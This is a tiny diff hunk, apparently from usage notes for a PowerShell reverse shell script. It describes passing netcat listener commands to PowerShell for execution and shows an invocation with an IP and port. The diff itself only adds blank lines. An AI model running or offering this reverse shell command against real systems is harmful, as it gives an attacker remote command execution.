@@ -7,4 +7,6 @@ This passes all commands entered from the netcat listener to PowerShell's Invoke
 
 # Usage:
 ./pwsh_revshell.ps1 
+
+
 pwsh_revshell -ip 127.0.0.1 -port 3333
